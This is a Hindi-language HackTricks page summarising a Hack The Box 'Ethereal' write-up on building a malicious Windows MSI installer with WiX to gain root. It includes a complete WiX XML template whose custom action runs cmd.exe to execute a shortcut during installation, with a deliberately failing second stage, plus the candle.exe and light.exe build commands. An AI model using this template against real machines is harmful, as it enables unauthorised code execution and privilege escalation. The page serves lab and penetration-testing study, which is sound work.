# Malicious MSI बनाना और Root प्राप्त करना

{{#include ../../banners/hacktricks-training.md}}

MSI installer का creation wixtools का उपयोग करके किया जाएगा, विशेष रूप से [wixtools](http://wixtoolset.org) का उपयोग किया जाएगा। यह उल्लेख करना उचित है कि alternative MSI builders को आज़माया गया था, लेकिन वे इस विशेष मामले में सफल नहीं हुए।<sup>[[1]](#references)</sup>

wix MSI usage examples की व्यापक समझ के लिए, [इस पेज](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) को देखना उचित है। यहाँ आपको विभिन्न examples मिलेंगे, जो wix MSI के usage को प्रदर्शित करते हैं।<sup>[[2]](#references)</sup>

उद्देश्य एक ऐसा MSI generate करना है जो lnk file को execute करेगा। इसे प्राप्त करने के लिए, निम्नलिखित XML code का उपयोग किया जा सकता है ([xml यहाँ से](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
यह ध्यान रखना महत्वपूर्ण है कि Package element में InstallerVersion और Compressed जैसी attributes शामिल होती हैं, जो क्रमशः installer के version को निर्दिष्ट करती हैं और यह बताती हैं कि package compressed है या नहीं।

Creation process में msi.xml से wixobject बनाने के लिए wixtools के एक tool candle.exe का उपयोग किया जाता है। निम्न command execute की जानी चाहिए:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
इसके अतिरिक्त, यह उल्लेखनीय है कि post में एक image दी गई है, जिसमें command और उसका output दिखाया गया है। Visual guidance के लिए आप इसका संदर्भ ले सकते हैं।<sup>[[1]](#references)</sup>

इसके अलावा, wixtools का एक अन्य tool, light.exe, wixobject से MSI file बनाने के लिए उपयोग किया जाएगा। निष्पादित की जाने वाली command इस प्रकार है:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
पिछली command के समान, command और उसके output को दर्शाने वाली एक image post में शामिल है।<sup>[[1]](#references)</sup>

कृपया ध्यान दें कि हालांकि इस summary का उद्देश्य उपयोगी जानकारी प्रदान करना है, फिर भी अधिक व्यापक विवरण और सटीक instructions के लिए original post देखने की अनुशंसा की जाती है।<sup>[[1]](#references)</sup>

## संदर्भ

- [1] [Hack The Box - Ethereal: Creating Malicious msi and getting root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [A quick introduction: Create an MSI installer with WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (wixtools भी देखें: [wixtools](http://wixtoolset.org))

{{#include ../../banners/hacktricks-training.md}}
